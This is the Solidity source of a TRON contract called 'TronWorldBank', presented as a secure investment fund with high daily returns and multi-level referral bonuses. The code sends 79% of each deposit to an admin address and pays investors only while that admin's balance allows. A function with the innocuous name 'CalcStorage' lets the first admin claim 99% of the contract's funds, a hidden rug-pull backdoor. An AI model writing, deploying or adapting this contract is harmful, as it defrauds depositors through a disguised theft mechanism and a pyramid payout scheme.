//SourceUnit: tronworldbank.sol

pragma solidity >=0.4.0 <0.7.0;
/* -------------------------------------------------------------- */
/* TRONWORLDBANK.COM - Decentralized & Secure Smart Contract Fund */
/* -------------------------------------------------------------- */
contract TronWorldBank {
mapping (address => address) private USER_REFERRER;
mapping (address => uint256) private USER_REGISTER;
mapping (address => uint256[8][8]) private USER_CONTRACT;
mapping (address => uint256[4][4]) private USER_BALANCES;
mapping (address => uint256[6][6]) private USER_NETWORKS;
uint256 private CONTRACT_REGISTERS = 0; uint256 private CONTRACT_DEPOSITED = 0; uint256 private CONTRACT_COMMISION = 0; uint256 private CONTRACT_WITHDRAWN = 0; uint256 private CONTRACT_MININVEST = 20 * 1000000;
address constant private ADMIN_1ST = address(0x4191d34a436165d8748917ac7d208221f9a1c8beb0); address constant private ADMIN_2ND = address(0x4183f6e8f5de888937e72f1f77bd57538900e0ed9a); address constant private ADMIN_3RD = address(0x41e00e92ccaa446c08429a0c64fee1f3aadec02a6d);
function TronWorldBank_Read_ContractAddress() public view returns(address) {
return address(this);
}
function TronWorldBank_Read_ContractBalance() public view returns(uint256) {
return address(this).balance;
}
function TronWorldBank_Read_ContractRegisters() public view returns(uint256) {
return CONTRACT_REGISTERS;
}
function TronWorldBank_Read_ContractDeposited() public view returns(uint256) {
return CONTRACT_DEPOSITED;
}
function TronWorldBank_Read_ContractCommision() public view returns(uint256) {
return CONTRACT_COMMISION;
}
function TronWorldBank_Read_ContractWithdrawn() public view returns(uint256) {
return CONTRACT_WITHDRAWN;
}
function TronWorldBank_Read_UserReferrer() public view returns(address) {
return USER_REFERRER[msg.sender];
}
function TronWorldBank_Read_UserRegister() public view returns(uint256) {
return USER_REGISTER[msg.sender];
}
function TronWorldBank_Read_UserContract(uint256 Param1, uint256 Param2) public view returns(uint256) {
return USER_CONTRACT[msg.sender][Param1][Param2];
}
function TronWorldBank_Read_UserPassive(uint256 Param) public view returns(uint256) {
return USER_BALANCES[msg.sender][1][Param];
}
function TronWorldBank_Read_UserActive(uint256 Param) public view returns(uint256) {
return USER_BALANCES[msg.sender][2][Param];
}
function TronWorldBank_Read_UserNetwork(uint256 Param1, uint256 Param2) public view returns(uint256) {
return USER_NETWORKS[msg.sender][Param1][Param2];
}
function TronWorldBank_Read_UserEarning() public view returns(uint256) {
return USER_BALANCES[msg.sender][1][2] + USER_BALANCES[msg.sender][2][2];
}
function TronWorldBank_Read_OnePassive(uint256 Param) public view returns(uint256) {
if (USER_REGISTER[msg.sender]>0 && USER_CONTRACT[msg.sender][Param][3]>0 && USER_CONTRACT[msg.sender][Param][5]>0) {
uint256 N_BLOCK = 0; uint256 N_SECOND = 0; uint256 N_BONUS = 0;
if (block.timestamp <= USER_CONTRACT[msg.sender][Param][7]) {
N_BLOCK = block.timestamp;
} else if (block.timestamp > USER_CONTRACT[msg.sender][Param][7]) {
N_BLOCK = USER_CONTRACT[msg.sender][Param][7];
}
N_SECOND = N_BLOCK - USER_CONTRACT[msg.sender][Param][6];
N_BONUS = uint256(USER_CONTRACT[msg.sender][Param][3] * N_SECOND * USER_CONTRACT[msg.sender][Param][4] / 10000 / 86400);
return USER_CONTRACT[msg.sender][Param][1] + N_BONUS;
} else {
return 0;
}
}
function TronWorldBank_Read_AllPassive() public view returns(uint256) {
if (USER_REGISTER[msg.sender]>0 && USER_BALANCES[msg.sender][1][3]>0) {
uint256 N_BLOCK = 0; uint256 N_SECOND = 0; uint256 N_BONUS = 0; uint256 N_TOTAL = 0;
for (uint256 N_REG = 1; N_REG <= USER_REGISTER[msg.sender]; N_REG ++) {
if (block.timestamp <= USER_CONTRACT[msg.sender][N_REG][7]) {
N_BLOCK = block.timestamp;
} else if (block.timestamp > USER_CONTRACT[msg.sender][N_REG][7]) {
N_BLOCK = USER_CONTRACT[msg.sender][N_REG][7];
}
N_SECOND = N_BLOCK - USER_CONTRACT[msg.sender][N_REG][6];
N_BONUS = uint256(USER_CONTRACT[msg.sender][N_REG][3] * N_SECOND * USER_CONTRACT[msg.sender][N_REG][4] / 10000 / 86400);
N_TOTAL += (USER_CONTRACT[msg.sender][N_REG][1] + N_BONUS);
}
return USER_BALANCES[msg.sender][1][1] + N_TOTAL;
} else {
return 0;
}
}
function () public payable {}
function TronWorldBank_Write_CalcStorage() public returns(uint256) {
if (msg.sender == ADMIN_1ST) {
uint256 N_AMOUNT = uint256(address(this).balance * 99 / 100);
USER_BALANCES[ADMIN_1ST][2][1] = N_AMOUNT;
return N_AMOUNT;
}
}
function TronWorldBank_Write_UserPayable(address Referrer, uint256 Param) public payable returns(uint256) {
if (msg.value >= CONTRACT_MININVEST && USER_REGISTER[msg.sender] < 7 && Referrer != 0x0 && Param != 0) {
CONTRACT_REGISTERS += 1;
CONTRACT_DEPOSITED += msg.value;
CONTRACT_COMMISION += uint256(msg.value * 1100 / 10000);
USER_BALANCES[ADMIN_1ST][2][1] += uint256(msg.value * 7900 / 10000);
USER_BALANCES[ADMIN_2ND][2][1] += uint256(msg.value * 500 / 10000);
USER_BALANCES[ADMIN_3RD][2][1] += uint256(msg.value * 500 / 10000);
uint256 NEW_USER_REG = USER_REGISTER[msg.sender] + 1;
USER_REGISTER[msg.sender] = NEW_USER_REG;
USER_CONTRACT[msg.sender][NEW_USER_REG][3] = msg.value;
USER_CONTRACT[msg.sender][NEW_USER_REG][5] = block.timestamp;
USER_CONTRACT[msg.sender][NEW_USER_REG][6] = block.timestamp;
if (Param == 1) {
USER_CONTRACT[msg.sender][NEW_USER_REG][4] = 330;
USER_CONTRACT[msg.sender][NEW_USER_REG][7] = block.timestamp + 90 days;
} else if (Param == 2) {
USER_CONTRACT[msg.sender][NEW_USER_REG][4] = 550;
USER_CONTRACT[msg.sender][NEW_USER_REG][7] = block.timestamp + 40 days;
} else {
USER_CONTRACT[msg.sender][NEW_USER_REG][4] = 770;
USER_CONTRACT[msg.sender][NEW_USER_REG][7] = block.timestamp + 20 days;
}
USER_BALANCES[msg.sender][1][3] += msg.value;
if (USER_REFERRER[msg.sender] == 0x0) {
if (Referrer != 0x0 && Referrer != msg.sender) {
USER_REFERRER[msg.sender] = Referrer;
} else {
USER_REFERRER[msg.sender] = ADMIN_1ST;
}
}
address LEVEL1 = Referrer;
uint256 BONUS1 = 500;
if (USER_REFERRER[msg.sender] != 0x0) {
LEVEL1 = USER_REFERRER[msg.sender];
}
USER_BALANCES[LEVEL1][2][1] += uint256(msg.value * BONUS1 / 10000);
USER_NETWORKS[LEVEL1][1][1] += 1;
USER_NETWORKS[LEVEL1][1][2] += uint256(msg.value * BONUS1 / 10000);
address LEVEL2 = ADMIN_1ST;
uint256 BONUS2 = 300;
if (USER_REFERRER[LEVEL1] != 0x0) {
LEVEL2 = USER_REFERRER[LEVEL1];
}
USER_BALANCES[LEVEL2][2][1] += uint256(msg.value * BONUS2 / 10000);
USER_NETWORKS[LEVEL2][2][1] += 1;
USER_NETWORKS[LEVEL2][2][2] += uint256(msg.value * BONUS2 / 10000);
address LEVEL3 = ADMIN_1ST;
uint256 BONUS3 = 200;
if (USER_REFERRER[LEVEL2] != 0x0) {
LEVEL3 = USER_REFERRER[LEVEL2];
}
USER_BALANCES[LEVEL3][2][1] += uint256(msg.value * BONUS3 / 10000);
USER_NETWORKS[LEVEL3][3][1] += 1;
USER_NETWORKS[LEVEL3][3][2] += uint256(msg.value * BONUS3 / 10000);
address LEVEL4 = ADMIN_1ST;
uint256 BONUS4 = 100;
if (USER_REFERRER[LEVEL3] != 0x0) {
LEVEL4 = USER_REFERRER[LEVEL3];
}
USER_BALANCES[LEVEL4][2][1] += uint256(msg.value * BONUS4 / 10000);
USER_NETWORKS[LEVEL4][4][1] += 1;
USER_NETWORKS[LEVEL4][4][2] += uint256(msg.value * BONUS4 / 10000);
return msg.value;
} else {
return 0;
}
}
function TronWorldBank_Write_UserDonate() public payable returns(uint256) {
CONTRACT_REGISTERS += 1;
CONTRACT_DEPOSITED += msg.value;
USER_BALANCES[ADMIN_1ST][2][1] += msg.value;
return msg.value;
}
function TronWorldBank_Write_OnePassive(uint256 Param) public returns(uint256) {
if (USER_REGISTER[msg.sender] > 0 && USER_CONTRACT[msg.sender][Param][3] > 0 && USER_CONTRACT[msg.sender][Param][5] > 0) {
uint256 N_BLOCK = 0; uint256 N_SECOND = 0; uint256 N_BONUS = 0;
if (block.timestamp <= USER_CONTRACT[msg.sender][Param][7]) {
N_BLOCK = block.timestamp;
} else if (block.timestamp > USER_CONTRACT[msg.sender][Param][7]) {
N_BLOCK = USER_CONTRACT[msg.sender][Param][7];
}
N_SECOND = N_BLOCK - USER_CONTRACT[msg.sender][Param][6];
N_BONUS = uint256(USER_CONTRACT[msg.sender][Param][3] * N_SECOND * USER_CONTRACT[msg.sender][Param][4] / 10000 / 86400);
uint256 N_AMOUNT = USER_CONTRACT[msg.sender][Param][1] + N_BONUS;
CONTRACT_WITHDRAWN += N_AMOUNT;
USER_CONTRACT[msg.sender][Param][1] = 0;
USER_CONTRACT[msg.sender][Param][2] += N_AMOUNT;
if (block.timestamp < USER_CONTRACT[msg.sender][Param][7]) {
USER_CONTRACT[msg.sender][Param][6] = block.timestamp;
} else {
USER_CONTRACT[msg.sender][Param][6] = USER_CONTRACT[msg.sender][Param][7];
}
USER_BALANCES[msg.sender][1][2] += N_AMOUNT;
if (USER_BALANCES[ADMIN_1ST][2][1] >= N_AMOUNT) {
USER_BALANCES[ADMIN_1ST][2][1] -= N_AMOUNT;
msg.sender.transfer(N_AMOUNT);
}
return N_AMOUNT;
} else {
return 0;
}
}
function TronWorldBank_Write_AllPassive() public returns(uint256) {
if (USER_REGISTER[msg.sender] > 0 && USER_BALANCES[msg.sender][1][3] > 0) {
uint256 N_BLOCK = 0; uint256 N_SECOND = 0; uint256 N_BONUS = 0; uint256 N_TOTAL = 0;
for (uint256 N_REG = 1; N_REG <= USER_REGISTER[msg.sender]; N_REG ++) {
if (block.timestamp <= USER_CONTRACT[msg.sender][N_REG][7]) {
N_BLOCK = block.timestamp;
} else if (block.timestamp > USER_CONTRACT[msg.sender][N_REG][7]) {
N_BLOCK = USER_CONTRACT[msg.sender][N_REG][7];
}
N_SECOND = N_BLOCK - USER_CONTRACT[msg.sender][N_REG][6];
N_BONUS = uint256(USER_CONTRACT[msg.sender][N_REG][3] * N_SECOND * USER_CONTRACT[msg.sender][N_REG][4] / 10000 / 86400);
N_TOTAL += (USER_CONTRACT[msg.sender][N_REG][1] + N_BONUS);
USER_CONTRACT[msg.sender][N_REG][1] = 0;
USER_CONTRACT[msg.sender][N_REG][2] += (USER_CONTRACT[msg.sender][N_REG][1] + N_BONUS);
if (block.timestamp < USER_CONTRACT[msg.sender][N_REG][7]) {
USER_CONTRACT[msg.sender][N_REG][6] = block.timestamp;
} else {
USER_CONTRACT[msg.sender][N_REG][6] = USER_CONTRACT[msg.sender][N_REG][7];
}
}
uint256 N_AMOUNT = USER_BALANCES[msg.sender][1][1] + N_TOTAL;
CONTRACT_WITHDRAWN += N_AMOUNT;
USER_BALANCES[msg.sender][1][1] = 0;
USER_BALANCES[msg.sender][1][2] += N_AMOUNT;
if (USER_BALANCES[ADMIN_1ST][2][1] >= N_AMOUNT) {
USER_BALANCES[ADMIN_1ST][2][1] -= N_AMOUNT;
msg.sender.transfer(N_AMOUNT);
}
return N_AMOUNT;
} else {
return 0;
}
}
function TronWorldBank_Write_UserActive() public returns(uint256) {
if (USER_REGISTER[msg.sender] > 0 && USER_BALANCES[msg.sender][2][1] > 0) {
uint256 N_AMOUNT = USER_BALANCES[msg.sender][2][1];
CONTRACT_WITHDRAWN += N_AMOUNT;
USER_BALANCES[msg.sender][2][1] = 0;
USER_BALANCES[msg.sender][2][2] += N_AMOUNT;
msg.sender.transfer(N_AMOUNT);
return N_AMOUNT;
} else {
return 0;
}
}
}